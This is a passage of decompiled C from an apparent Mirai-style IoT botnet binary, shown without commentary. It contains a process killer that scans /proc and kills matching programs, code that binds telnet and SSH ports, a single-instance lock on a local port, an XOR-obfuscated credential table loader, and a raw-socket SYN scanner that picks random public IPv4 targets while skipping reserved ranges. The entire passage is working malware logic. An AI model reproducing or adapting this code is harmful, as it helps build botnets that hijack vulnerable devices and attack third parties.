              iVar13 = FUN_08052190(auStack_1231);
              FUN_080521b0(auStack_1231 + iVar13,iVar14);
              uVar8 = FUN_08051790(9,0);
              iVar13 = FUN_08052190(auStack_1231);
              FUN_080521b0(auStack_1231 + iVar13,uVar8);
              iVar13 = FUN_08052678(auStack_1231);
              if (iVar13 != 0) {
                while ((iVar10 = FUN_080526c0(iVar13), iVar10 != 0 && (!bVar3))) {
                  FUN_08052220(auStack_2231,0x1000,0,0);
                  uVar8 = FUN_08051790(6,0);
                  FUN_080521b0(auStack_1231,uVar8);
                  iVar11 = FUN_08052190(auStack_1231);
                  FUN_080521b0(auStack_1231 + iVar11,iVar14);
                  uVar8 = FUN_08051790(9,0);
                  iVar11 = FUN_08052190(auStack_1231);
                  FUN_080521b0(auStack_1231 + iVar11,uVar8);
                  iVar11 = FUN_08052190(auStack_1231);
                  puVar15 = auStack_1231 + iVar11;
                  FUN_080521b0(puVar15,&DAT_0805622d);
                  iVar11 = FUN_08052190(auStack_1231);
                  FUN_080521b0(auStack_1231 + iVar11,iVar10 + 0x13);
                  iVar10 = FUN_08054d10(auStack_1231,auStack_2231,0x1000);
                  if (iVar10 != -1) {
                    uVar8 = FUN_08052190(auStack_2231);
                    iVar10 = FUN_08052470(auStack_2231,uVar8,&uStack_20);
                    if (iVar10 != -1) {
                      uVar8 = FUN_08052290(iVar14,10,puVar15,puVar15);
                      FUN_080545e0(uVar8,9);
                      bVar3 = true;
                    }
                  }
                }
                FUN_08052654(iVar13);
              }
            }
          }
        }
        FUN_08052654(iVar5);
        bVar12 = bVar3;
      }
      FUN_08054d4c(1);
      FUN_080517c0(6);
      FUN_080517c0(7);
      FUN_080517c0(9);
      return bVar12;
    }
    FUN_080517c0(6);
    FUN_080517c0(7);
    FUN_080517c0(9);
  }
  return false;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0804df00(void)

{
  undefined2 uVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  uint uVar12;
  int iVar13;
  uint uVar14;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  byte *pbVar15;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  int iVar16;
  undefined *puVar17;
  int iVar18;
  uint uVar19;
  undefined8 uVar20;
  undefined *puVar21;
  uint uStack_20f0;
  byte abStack_20c4 [4096];
  undefined auStack_10c4 [4096];
  undefined auStack_c4 [64];
  undefined auStack_84 [64];
  undefined auStack_44 [16];
  undefined2 uStack_34;
  undefined2 uStack_32;
  undefined4 uStack_30;
  int iStack_24;
  uint uStack_20;
  int iStack_1c;
  int iStack_18;
  int iStack_14;
  
  iVar2 = FUN_08054c4c(0);
  _DAT_080576d8 = FUN_080544c5();
  if ((_DAT_080576d8 < 1) && (_DAT_080576d8 != -1)) {
    uStack_34 = 2;
    uStack_30 = 0;
    uVar1 = FUN_080540b4(0x17);
    FUN_0804d8c0(uVar1);
    uStack_32 = FUN_080540b4(0x17);
    uVar20 = FUN_080543a4(2,1,0);
    iVar3 = (int)uVar20;
    if (iVar3 != -1) {
      FUN_08053f34(iVar3,&uStack_34,0x10,(int)((ulonglong)uVar20 >> 0x20));
      FUN_080541d4(iVar3,1);
    }
    uVar1 = FUN_080540b4(0x16);
    FUN_0804d8c0(uVar1);
    uStack_32 = FUN_080540b4(0x16);
    iVar3 = FUN_080543a4(2,1,0);
    if (iVar3 != -1) {
      FUN_08053f34(iVar3,&uStack_34,0x10,extraout_ECX);
      FUN_080541d4(iVar3,1);
    }
    FUN_08054d4c(5);
    DAT_080576d4 = (undefined *)FUN_08053520(0x1000);
    *DAT_080576d4 = 0;
    _DAT_08057100 = 0;
    FUN_08051840(6);
    FUN_08051840(7);
    uVar4 = FUN_08051790(6,0);
    iVar3 = FUN_080521b0(auStack_10c4,uVar4);
    puVar17 = auStack_10c4 + iVar3;
    uVar4 = FUN_08054cd0();
    uVar4 = FUN_08052590(uVar4,10,auStack_44);
    puVar21 = puVar17;
    iVar3 = FUN_080521b0(puVar17,uVar4);
    uVar4 = FUN_08051790(7,0);
    iVar5 = FUN_080521b0(puVar17 + iVar3,uVar4);
    iVar6 = FUN_08052a68(auStack_10c4,0);
    if (iVar6 != -1) {
      FUN_08054c95(iVar6);
      FUN_080517c0(6);
      FUN_080517c0(7);
      iVar6 = FUN_08054d10(auStack_10c4,DAT_080576d4,0xfff);
      if (iVar6 != -1) {
        DAT_080576d4[iVar6] = 0;
      }
      iVar6 = 400;
      FUN_08052220(auStack_10c4,puVar17 + iVar3 + (iVar5 - (int)auStack_10c4),puVar21,puVar21);
      uStack_20f0 = 0;
      while( true ) {
        FUN_08051840(6);
        uVar4 = FUN_08051790(6,0);
        iVar3 = FUN_08052678(uVar4);
        if (iVar3 == 0) break;
        FUN_080517c0(6);
LAB_0804e180:
        iVar5 = FUN_080526c0(iVar3);
        if (iVar5 != 0) {
          if ((byte)(*(char *)(iVar5 + 0x13) - 0x30U) < 10) {
            iVar5 = iVar5 + 0x13;
            iVar7 = FUN_08054740(iVar5);
            uStack_20f0 = uStack_20f0 + 1;
            if (iVar6 < iVar7) {
              iVar2 = FUN_08054c4c(0);
              FUN_08051840(6);
              FUN_08051840(7);
              uVar4 = FUN_08051790(6,0);
              iVar6 = FUN_080521b0(auStack_84,uVar4);
              iVar8 = FUN_080521b0(auStack_84 + iVar6,iVar5);
              uVar4 = FUN_08051790(7,0);
              FUN_080521b0(auStack_84 + iVar6 + iVar8,uVar4);
              uVar4 = FUN_08051790(6,0);
              iVar6 = FUN_080521b0(auStack_c4,uVar4);
              puVar17 = auStack_c4 + iVar6;
              iVar5 = FUN_080521b0(puVar17,iVar5);
              uVar4 = FUN_08051790(0xb,0);
              FUN_080521b0(puVar17 + iVar5,uVar4);
              FUN_080517c0(6);
              FUN_080517c0(7);
              puVar21 = auStack_10c4;
              iVar5 = FUN_08054d10(auStack_84,puVar21,0xfff);
              iVar6 = iVar7;
              if (iVar5 != -1) {
                auStack_10c4[iVar5] = 0;
                puVar17 = puVar21;
                FUN_08051840(10);
                uVar4 = FUN_08051790(10,0);
                iVar5 = FUN_08052470(auStack_10c4,iVar5 + -1,uVar4);
                if (iVar5 != -1) {
                  FUN_08054d80(auStack_10c4);
                  FUN_080545e0(iVar7,9);
                }
                FUN_080517c0(10);
                iVar5 = FUN_08054cd0();
                if (((iVar7 == iVar5) || (iVar5 = FUN_08054cdc(), iVar7 == iVar5)) ||
                   (uVar4 = FUN_080524f0(auStack_10c4,DAT_080576d4,iVar5,iVar5), (char)uVar4 != '\0'
                   )) goto LAB_0804e180;
                iVar5 = FUN_08052a68(auStack_10c4,0,uVar4,uVar4);
                if (iVar5 == -1) {
                  FUN_080545e0(iVar7,9,auStack_10c4,auStack_10c4);
                }
                FUN_08054c95(iVar5);
              }
              iVar5 = FUN_08052a68(auStack_84,0,puVar17,puVar17);
              uVar4 = extraout_ECX_00;
              if (iVar5 != -1) {
                FUN_08051840(0xc);
                FUN_08051840(0xd);
                FUN_08051840(0xe);
                FUN_08051840(0xf);
                FUN_08051840(0x10);
                iVar8 = FUN_08051790(0xc,&iStack_14);
                iVar9 = FUN_08051790(0xd,&iStack_18);
                iVar10 = FUN_08051790(0xe,&iStack_1c);
                iVar11 = FUN_08051790(0xf,&uStack_20);
                uVar12 = FUN_08051790(0x10,&iStack_24);
                uVar14 = uVar12;
                while (iVar13 = FUN_08054ce8(iVar5,abStack_20c4,0x1000,uVar14), 0 < iVar13) {
                  if (iStack_14 <= iVar13) {
                    iVar16 = iVar13 + -1;
                    pbVar15 = abStack_20c4;
                    if (iVar16 != -1) {
                      iVar18 = 0;
                      do {
                        if (*pbVar15 == *(byte *)(iVar8 + iVar18)) {
                          iVar18 = iVar18 + 1;
                          if (iStack_14 == iVar18) goto LAB_0804e5fa;
                        }
                        else {
                          iVar18 = 0;
                        }
                        iVar16 = iVar16 + -1;
                        pbVar15 = pbVar15 + 1;
                      } while (iVar16 != -1);
                    }
                  }
                  if (iStack_18 <= iVar13) {
                    iVar16 = 0;
                    pbVar15 = abStack_20c4;
                    iVar18 = iVar13;
                    while (iVar18 = iVar18 + -1, iVar18 != -1) {
                      if (*pbVar15 == *(byte *)(iVar9 + iVar16)) {
                        iVar16 = iVar16 + 1;
                        if (iStack_18 == iVar16) goto LAB_0804e5fa;
                      }
                      else {
                        iVar16 = 0;
                      }
                      pbVar15 = pbVar15 + 1;
                    }
                  }
                  if (iStack_1c <= iVar13) {
                    iVar16 = 0;
                    pbVar15 = abStack_20c4;
                    iVar18 = iVar13;
                    while (iVar18 = iVar18 + -1, iVar18 != -1) {
                      if (*pbVar15 == *(byte *)(iVar10 + iVar16)) {
                        iVar16 = iVar16 + 1;
                        if (iStack_1c == iVar16) goto LAB_0804e5fa;
                      }
                      else {
                        iVar16 = 0;
                      }
                      pbVar15 = pbVar15 + 1;
                    }
                  }
                  uVar14 = uStack_20;
                  if ((int)uStack_20 <= iVar13) {
                    iVar16 = iVar13 + -1;
                    pbVar15 = abStack_20c4;
                    if (iVar16 != -1) {
                      uVar19 = 0;
                      do {
                        uVar14 = (uint)*pbVar15;
                        if (*pbVar15 == *(byte *)(iVar11 + uVar19)) {
                          uVar19 = uVar19 + 1;
                          if (uStack_20 == uVar19) goto LAB_0804e5fa;
                        }
                        else {
                          uVar19 = 0;
                        }
                        pbVar15 = pbVar15 + 1;
                        iVar16 = iVar16 + -1;
                      } while (iVar16 != -1);
                    }
                  }
                  if (iStack_24 <= iVar13) {
                    pbVar15 = abStack_20c4;
                    iVar16 = 0;
                    while (iVar13 = iVar13 + -1, iVar13 != -1) {
                      uVar14 = (uint)*pbVar15;
                      if (*pbVar15 == *(byte *)(uVar12 + iVar16)) {
                        iVar16 = iVar16 + 1;
                        if (iStack_24 == iVar16) goto LAB_0804e5fa;
                        pbVar15 = pbVar15 + 1;
                      }
                      else {
                        iVar16 = 0;
                        pbVar15 = pbVar15 + 1;
                      }
                    }
                  }
                }
                FUN_080517c0(0xc);
                FUN_080517c0(0xd);
                FUN_080517c0(0xe);
                FUN_080517c0(0xf);
                FUN_080517c0(0x10);
                FUN_08054c95(iVar5);
                uVar4 = extraout_ECX_02;
              }
              goto LAB_0804e64c;
            }
            iVar5 = FUN_08054c4c(0);
            if (iVar5 - iVar2 < 0x259) {
              if ((400 < iVar7) && (uStack_20f0 == (uStack_20f0 / 10) * 10)) {
                FUN_08054d4c(1);
              }
            }
            else {
              iVar6 = 400;
            }
          }
          goto LAB_0804e180;
        }
        FUN_08052654(iVar3);
      }
    }
  }
  return;
LAB_0804e5fa:
  FUN_080517c0(0xc);
  FUN_080517c0(0xd);
  FUN_080517c0(0xe);
  FUN_080517c0(0xf);
  FUN_080517c0(0x10);
  FUN_08054c95(iVar5);
  FUN_080545e0(iVar7,9);
  uVar4 = extraout_ECX_01;
LAB_0804e64c:
  FUN_08052220(auStack_84,0x40,uVar4,uVar4);
  FUN_08052220(auStack_c4,0x40);
  FUN_08054d4c(1);
  goto LAB_0804e180;
}



void FUN_0804e730(void)

{
  undefined2 uVar1;
  uint uVar2;
  undefined4 *puVar3;
  int *piVar4;
  undefined4 uVar5;
  undefined8 uVar6;
  undefined2 uStack_18;
  undefined2 uStack_16;
  undefined4 uStack_14;
  undefined4 uStack_8;
  
  uStack_8 = 1;
  DAT_08057070 = FUN_080543a4(2,1,0);
  if (DAT_08057070 != -1) {
    FUN_08054350(DAT_08057070,1,2,&uStack_8,4);
    uVar2 = FUN_080528f0(DAT_08057070,3,0);
    FUN_080528f0(DAT_08057070,4,uVar2 | 0x800);
    uStack_18 = 2;
    uStack_14 = DAT_080576dc;
    if (DAT_0805707c != '\0') {
      uStack_14 = FUN_08054088(0x7f000001);
    }
    uStack_16 = FUN_080540b4(0xbbe5);
    puVar3 = (undefined4 *)FUN_080528b0();
    *puVar3 = 0;
    uVar6 = FUN_08053f34(DAT_08057070,&uStack_18,0x10);
    uVar5 = (undefined4)((ulonglong)uVar6 >> 0x20);
    if ((int)uVar6 == -1) {
      piVar4 = (int *)FUN_080528b0();
      if (*piVar4 == 99) {
        DAT_0805707c = '\0';
      }
      uStack_18 = 2;
      uStack_14 = 0;
      uStack_16 = FUN_080540b4(0xbbe5);
      FUN_08053f88(DAT_08057070,&uStack_18,0x10);
      FUN_08054d4c(5);
      FUN_08054c95(DAT_08057070);
      uVar1 = FUN_080540b4(0xbbe5);
      FUN_0804d8c0(uVar1);
      FUN_0804e730();
      return;
    }
    FUN_080541d4(DAT_08057070,1,uVar5,uVar5);
  }
  return;
}



void FUN_0804f4a0(void)

{
  uint uVar1;
  
  uVar1 = DAT_08057108 << 0xb ^ DAT_08057108;
  DAT_08057108 = DAT_0805710c;
  DAT_0805710c = DAT_08057110;
  DAT_08057110 = DAT_08057114;
  DAT_08057114 = DAT_08057114 >> 0x13 ^ DAT_08057114 ^ uVar1 ^ uVar1 >> 8;
  return;
}



void FUN_0804f4e0(void)

{
  uint uVar1;
  uint uVar2;
  
  DAT_08057108 = FUN_08054c4c(0);
  uVar1 = FUN_08054cd0();
  uVar2 = FUN_08054cdc();
  DAT_0805710c = uVar2 ^ uVar1;
  DAT_08057110 = FUN_08054b40();
  DAT_08057114 = DAT_08057110 ^ DAT_0805710c;
  return;
}



void FUN_0804f520(char *param_1,uint param_2)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  uint uStack_44;
  undefined4 auStack_31 [8];
  
  puVar4 = &DAT_08056304;
  puVar5 = auStack_31;
  for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar5 = *puVar4;
    puVar4 = puVar4 + 1;
    puVar5 = puVar5 + 1;
  }
  *(undefined *)puVar5 = 0;
  if (0 < (int)param_2) {
    uStack_44 = DAT_0805710c;
    uVar1 = uStack_44;
    do {
      uStack_44 = uVar1;
      DAT_0805710c = DAT_08057110;
      DAT_08057110 = DAT_08057114;
      if (param_2 < 4) {
        param_2 = param_2 - 1;
        uVar1 = DAT_08057108 << 0xb ^ DAT_08057108;
        DAT_08057114 = DAT_08057110 >> 0x13 ^ DAT_08057110 ^ uVar1 ^ uVar1 >> 8;
        *param_1 = (char)DAT_08057114 -
                   ((char)(DAT_08057114 / 0x21 << 5) + (char)(DAT_08057114 / 0x21));
        param_1 = param_1 + 1;
      }
      else {
        param_2 = param_2 - 4;
        uVar1 = DAT_08057108 << 0xb ^ DAT_08057108;
        uVar3 = DAT_08057110 >> 0x13 ^ DAT_08057110 ^ uVar1;
        DAT_08057114 = uVar3 ^ uVar1 >> 8;
        *param_1 = *(char *)((int)auStack_31 + (DAT_08057114 >> 3 & 0x1f));
        param_1[1] = *(char *)((int)auStack_31 + (DAT_08057114 >> 0xb & 0x1f));
        param_1[2] = *(char *)((int)auStack_31 + (DAT_08057114 >> 0x13 & 0x1f));
        param_1[3] = *(char *)((int)auStack_31 + (uVar3 >> 0x1b));
        param_1 = param_1 + 4;
      }
      DAT_08057108 = uStack_44;
      uVar1 = DAT_0805710c;
    } while (0 < (int)param_2);
  }
  return;
}



void FUN_0804fc70(void)

{
  FUN_080545e0(DAT_080576f8,9);
  return;
}



void __regparm3 FUN_0804fc90(int param_1)

{
  int iVar1;
  uint uVar2;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  undefined4 uStack_8;
  
  uStack_14 = 0;
  uStack_10 = 0;
  uStack_c = 0;
  uStack_8 = 0;
  iVar1 = *(int *)(param_1 + 4);
  if (iVar1 != -1) {
    iVar1 = FUN_08054c95(iVar1);
  }
  iVar1 = FUN_080543a4(2,1,0,iVar1);
  *(int *)(param_1 + 4) = iVar1;
  iVar1 = iVar1 + 1;
  if (iVar1 != 0) {
    *(undefined4 *)(param_1 + 0x18) = 0;
    FUN_08052220(param_1 + 0x1c,0x100,iVar1,iVar1);
    uVar2 = FUN_080528f0(*(undefined4 *)(param_1 + 4),3,0);
    FUN_080528f0(*(undefined4 *)(param_1 + 4),4,uVar2 | 0x800);
    uStack_10 = *(undefined4 *)(param_1 + 0x10);
    uStack_14 = CONCAT22((short)*(undefined4 *)(param_1 + 0x14),2);
    *(undefined4 *)(param_1 + 8) = DAT_08057150;
    *(undefined4 *)(param_1 + 0xc) = 1;
    FUN_08053f88(*(undefined4 *)(param_1 + 4),&uStack_14,0x10);
  }
  return;
}



void __regparm3 FUN_0804fd60(undefined4 param_1,undefined4 param_2,short param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  
  iVar2 = FUN_08053ae0(DAT_08057148,(DAT_08057118 + 1) * 0x10);
  iVar1 = DAT_08057118;
  DAT_08057148 = iVar2;
  iVar3 = FUN_08052190(param_1);
  iVar4 = FUN_08053520(iVar3 + 1);
  FUN_080521f0(iVar4,param_1,iVar3 + 1);
  if (0 < iVar3) {
    iVar5 = 0;
    do {
      *(byte *)(iVar5 + iVar4) = *(byte *)(iVar5 + iVar4) ^ 0x22;
      iVar5 = iVar5 + 1;
    } while (iVar5 != iVar3);
  }
  iVar5 = DAT_08057148;
  iVar6 = DAT_08057118 * 0x10;
  *(int *)(iVar1 * 0x10 + iVar2) = iVar4;
  *(char *)(iVar6 + 0xc + iVar5) = (char)iVar3;
  iVar1 = DAT_08057148;
  iVar2 = FUN_08052190(param_2);
  iVar3 = FUN_08053520(iVar2 + 1);
  FUN_080521f0(iVar3,param_2,iVar2 + 1);
  if (0 < iVar2) {
    iVar4 = 0;
    do {
      *(byte *)(iVar4 + iVar3) = *(byte *)(iVar4 + iVar3) ^ 0x22;
      iVar4 = iVar4 + 1;
    } while (iVar4 != iVar2);
  }
  iVar4 = DAT_08057148;
  *(int *)(iVar6 + 4 + iVar1) = iVar3;
  iVar3 = DAT_08057118 * 0x10;
  *(char *)(iVar3 + 0xd + iVar4) = (char)iVar2;
  iVar1 = DAT_08057148;
  DAT_08057118 = DAT_08057118 + 1;
  *(short *)(iVar3 + 8 + DAT_08057148) = DAT_0805714c;
  *(short *)(iVar3 + 10 + iVar1) = DAT_0805714c + param_3;
  DAT_0805714c = DAT_0805714c + param_3;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0804fe90(void)

{
  char *pcVar1;
  undefined2 uVar2;
  char cVar3;
  ushort uVar4;
  ushort uVar5;
  short sVar6;
  int iVar7;
  uint uVar8;
  undefined4 *puVar9;
  int *piVar10;
  int iVar11;
  undefined *puVar12;
  undefined4 uVar13;
  byte *pbVar14;
  undefined2 *puVar15;
  byte bVar16;
  byte bVar17;
  undefined4 extraout_ECX;
  uint uVar18;
  int iVar19;
  int *piVar20;
  char *pcVar21;
  undefined *puVar22;
  int **ppiVar23;
  int *unaff_EBP;
  int *unaff_EDI;
  int *apiStackY_7b0 [6];
  int aiStackY_798 [3];
  uint uStack_77c;
  undefined4 uStack_778;
  uint uStack_774;
  int *apiStack_76c [2];
  char *apcStack_764 [3];
  int iStack_758;
  int *piStack_754;
  ushort uStack_74e;
  undefined auStack_c4 [108];
  undefined2 auStack_58 [2];
  undefined4 auStack_54 [3];
  undefined auStack_45 [9];
  int aiStack_3c [3];
  uint auStack_30 [2];
  undefined auStack_25 [3];
  undefined2 auStack_22 [3];
  int aiStack_1c [3];
  
  ppiVar23 = apiStack_76c;
  DAT_080576f8 = FUN_080544c5();
  if ((0 < DAT_080576f8) || (DAT_080576f8 == -1)) {
    return;
  }
  DAT_080576dc = FUN_080523e0();
  FUN_0804f4e0();
  uStack_77c = 0;
  DAT_08057150 = (int *)FUN_08054c4c();
  uStack_778 = 0x120;
  uStack_77c = 0x80;
  iVar7 = FUN_08052be0();
  aiStack_1c[0] = 0;
  DAT_080576f0 = iVar7;
  do {
    *(undefined4 *)(aiStack_1c[0] * 0x120 + 0xc + iVar7) = 0;
    *(undefined4 *)(aiStack_1c[0] * 0x120 + 4 + iVar7) = 0xffffffff;
    aiStack_1c[0] = aiStack_1c[0] + 1;
  } while (aiStack_1c[0] < 0x80);
  uStack_774 = 6;
  uStack_778 = 3;
  uStack_77c = 2;
  DAT_080576f4 = FUN_080543a4();
  if (DAT_080576f4 == 0xffffffff) goto LAB_0805090d;
  uStack_774 = 0;
  uStack_778 = 3;
  uStack_77c = DAT_080576f4;
  uStack_774 = FUN_080528f0();
  uStack_774 = uStack_774 | 0x800;
  uStack_778 = 4;
  uStack_77c = DAT_080576f4;
  FUN_080528f0();
  aiStack_1c[0] = 1;
  uStack_77c = 4;
  iVar7 = FUN_08054350(DAT_080576f4,0,3,aiStack_1c);
  ppiVar23 = apiStack_76c;
  if (iVar7 != 0) {
    uStack_77c = DAT_080576f4;
    FUN_08054c95();
    uStack_77c = 0;
    FUN_080528bd();
    ppiVar23 = (int **)&uStack_77c;
    goto LAB_08050a48;
  }
  do {
    uVar4 = FUN_0804f4a0();
    uStack_77c = (uint)uVar4;
    uStack_74e = uVar4;
    uVar5 = FUN_08054254();
  } while (uVar5 < 0x400);
  DAT_08057120 = 0x45;
  uStack_77c = 0x28;
  _DAT_08057122 = FUN_080540b4();
  _DAT_08057124 = FUN_0804f4a0();
  uStack_77c = 0x17;
  DAT_08057128 = 0x40;
  DAT_08057129 = 6;
  DAT_08057136 = FUN_080540b4();
  DAT_08057140 = DAT_08057140 & 0xf | 0x50;
  _DAT_08057134 = uVar4;
  _DAT_08057142 = FUN_0804f4a0();
  DAT_08057141 = DAT_08057141 | 2;
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  FUN_0804fd60();
  apcStack_764[0] = auStack_c4;
  apcStack_764[1] = auStack_45 + 1;
LAB_08050503:
  puVar22 = (undefined *)ppiVar23;
  if (*(int **)((int)ppiVar23 + 0x20) == DAT_08057150) goto LAB_0805073e;
  *(undefined4 *)((int)ppiVar23 + 0x750) = 0;
  unaff_EDI = DAT_08057150;
LAB_0805051e:
  *(undefined4 *)(puVar22 + 0x724) = 0;
  *(undefined4 *)(puVar22 + 0x728) = 0;
  *(undefined4 *)(puVar22 + 0x72c) = 0;
  *(undefined4 *)(puVar22 + 0x730) = 0;
  *(undefined4 *)(puVar22 + -4) = 0x805054f;
  _DAT_08057124 = FUN_0804f4a0();
  _DAT_0805712c = DAT_080576dc;
LAB_08050560:
  do {
    do {
      *(undefined4 *)(puVar22 + -4) = 0x8050565;
      uVar8 = FUN_0804f4a0();
      bVar17 = (byte)uVar8;
    } while (bVar17 == 0x7f);
  } while ((((bVar17 == 0) || (bVar17 == 3)) || ((byte)(bVar17 - 0xf) < 2)) ||
          ((bVar17 == 0x38 || (bVar17 == 10))));
  bVar16 = (byte)(uVar8 >> 8);
  if (bVar17 == 0xc0) {
    if (bVar16 == 0xa8) goto LAB_08050560;
LAB_080505ae:
    if (bVar17 == 0xa9) {
      if (bVar16 == 0xff) goto LAB_08050560;
    }
    else {
LAB_080505b7:
      if (bVar17 == 0xc6) {
        if ((bVar16 < 0x12) || (0x13 < bVar16)) goto LAB_080505c5;
        goto LAB_08050560;
      }
    }
LAB_080505c0:
    if (0xdf < bVar17) goto LAB_08050560;
  }
  else {
    if (bVar17 != 0xac) {
      if (bVar17 != 100) goto LAB_080505ae;
      if (bVar16 < 0x40) goto LAB_080505c5;
      if (0x7e < bVar16) goto LAB_080505c0;
      goto LAB_08050560;
    }
    if (0xf < bVar16) {
      if (0x1f < bVar16) goto LAB_080505b7;
      goto LAB_08050560;
    }
  }
LAB_080505c5:
  if ((((((byte)(bVar17 - 6) < 2) || (bVar17 == 0xb)) || (bVar17 == 0x15)) ||
      ((bVar17 == 0x16 || (bVar17 == 0x1a)))) ||
     ((((bVar17 == 0x1c || ((bVar17 == 0x1d || (bVar17 == 0x1e)))) || (bVar17 == 0x21)) ||
      (((bVar17 == 0x37 || (bVar17 == 0xd6)) || (bVar17 == 0xd7)))))) goto LAB_08050560;
  *(uint *)(puVar22 + -0x10) =
       uVar8 << 0x18 | (uint)bVar16 << 0x10 | uVar8 >> 0x18 | (uVar8 >> 0x10 & 0xff) << 8;
  *(undefined4 *)(puVar22 + -0x14) = 0x8050646;
  DAT_08057130 = FUN_08054088();
  _DAT_0805712a = 0;
  *(undefined4 *)(puVar22 + -0xc) = 0x14;
  *(undefined **)(puVar22 + -0x10) = &DAT_08057120;
  *(undefined4 *)(puVar22 + -0x14) = 0x8050662;
  _DAT_0805712a = FUN_0804d790();
  if (*(int *)(puVar22 + 0x750) % 10 == 0) goto LAB_08050917;
  *(undefined4 *)(puVar22 + -0x10) = 0x17;
  *(undefined4 *)(puVar22 + -0x14) = 0x8050692;
  DAT_08057136 = FUN_080540b4();
LAB_0805069b:
  _DAT_08057138 = DAT_08057130;
  _DAT_08057144 = 0;
  *(undefined4 *)(puVar22 + -0x10) = 0x14;
  *(undefined4 *)(puVar22 + -0x14) = 0x80506b8;
  uVar8 = FUN_080540b4();
  *(undefined4 *)(puVar22 + -0x14) = 0x14;
  *(uint *)(puVar22 + -0x18) = uVar8 & 0xffff;
  *(undefined **)(puVar22 + -0x1c) = &DAT_08057134;
  *(undefined **)(puVar22 + -0x20) = &DAT_08057120;
  *(undefined4 *)(puVar22 + -0x24) = 0x80506cf;
  _DAT_08057144 = FUN_0804d7e0();
  *(undefined4 *)(puVar22 + 0x728) = DAT_08057130;
  *(undefined2 *)(puVar22 + 0x726) = DAT_08057136;
  *(undefined2 *)(puVar22 + 0x724) = 2;
  *(undefined4 *)(puVar22 + -0xc) = 0x10;
  *(undefined **)(puVar22 + -0x10) = puVar22 + 0x724;
  *(undefined4 *)(puVar22 + -0x14) = 0x4000;
  *(undefined4 *)(puVar22 + -0x18) = 0x28;
  *(undefined **)(puVar22 + -0x1c) = &DAT_08057120;
  *(uint *)(puVar22 + -0x20) = DAT_080576f4;
  *(undefined4 *)(puVar22 + -0x24) = 0x805071d;
  FUN_080542f8();
  iVar7 = *(int *)(puVar22 + 0x750);
  *(int *)(puVar22 + 0x750) = iVar7 + 1;
  if (0x9f < iVar7 + 1) {
    *(int **)(puVar22 + 0x20) = unaff_EDI;
LAB_0805073e:
    iVar7 = 0;
LAB_08050740:
    do {
      *(undefined4 *)(puVar22 + -4) = 0x8050745;
      puVar9 = (undefined4 *)FUN_080528b0();
      *puVar9 = 0;
      *(undefined4 **)(puVar22 + -4) = puVar9;
      *(undefined4 **)(puVar22 + -8) = puVar9;
      *(undefined4 *)(puVar22 + -0xc) = 0;
      *(undefined4 *)(puVar22 + -0x10) = 0;
      *(undefined4 *)(puVar22 + -0x14) = 0x4000;
      *(undefined4 *)(puVar22 + -0x18) = 0x5ea;
      *(undefined **)(puVar22 + -0x1c) = puVar22 + 0x3a;
      *(uint *)(puVar22 + -0x20) = DAT_080576f4;
      *(undefined4 *)(puVar22 + -0x24) = 0x805076b;
      uVar8 = FUN_08054280();
      if ((int)uVar8 < 1) {
LAB_08050932:
        puVar12 = puVar22 + 0x6a8;
        do {
          *(undefined4 *)(puVar12 + -4) = 0;
          puVar12 = puVar12 + 4;
        } while (puVar12 != *(undefined **)(puVar22 + 0xc));
        puVar12 = puVar22 + 0x628;
        do {
          *(undefined4 *)(puVar12 + -4) = 0;
          puVar12 = puVar12 + 4;
        } while (puVar12 != *(undefined **)(puVar22 + 8));
        unaff_EBP = (int *)0x0;
        unaff_EDI = (int *)0x0;
        iVar7 = 0;
        *(undefined4 *)(puVar22 + 0x750) = 0;
        do {
          iVar7 = iVar7 * 0x120 + DAT_080576f0;
          pbVar14 = *(byte **)(iVar7 + 0xc);
          if (pbVar14 != (byte *)0x0) {
            if ((-(uint)(pbVar14 < (byte *)0x2) & 0xffffffe7) + 0x1e <
                (uint)((int)DAT_08057150 - *(int *)(iVar7 + 8))) {
              *(undefined4 *)(puVar22 + -0x10) = *(undefined4 *)(iVar7 + 4);
              *(undefined4 *)(puVar22 + -0x14) = 0x80509f8;
              FUN_08054c95();
              *(undefined4 *)(iVar7 + 4) = 0xffffffff;
              if ((*(uint *)(iVar7 + 0xc) < 3) ||
                 (cVar3 = *(char *)(iVar7 + 0x11c) + '\x01', *(char *)(iVar7 + 0x11c) = cVar3,
                 cVar3 == '\n')) {
                *(undefined *)(iVar7 + 0x11c) = 0;
                *(undefined4 *)(iVar7 + 0xc) = 0;
              }
              else {
